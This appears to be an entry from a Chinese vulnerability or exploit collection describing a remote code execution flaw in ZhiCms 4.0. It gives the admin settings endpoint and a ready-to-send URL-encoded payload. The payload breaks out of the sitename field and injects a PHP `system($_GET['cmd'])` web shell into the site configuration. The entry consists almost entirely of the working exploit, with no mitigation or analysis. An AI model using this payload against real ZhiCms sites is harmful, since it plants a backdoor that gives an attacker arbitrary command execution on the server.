# ZhiCms4.0RCE漏洞

ZhiCms4 ｜ 命令执行 ｜ —
- **请求**：`POST /index.php?r=manage/set/index HTTP/1.1`

**Payload**
```
sitename=')%3Bsystem(%24_GET%5B'cmd'%5D)%3B%2F*&hosturl=&logo=public%2Fweb%2Fimages%2Flogoh2014r.png&ewm=public%2Fweb%2Fimages%2Flogoh2014r.png&appkey=&secretKey=&pid=&apiurl=https%3A%2F%2Fwww.baidu.com%2F&code=&zhuan=0&download=
```
- **响应特征**：200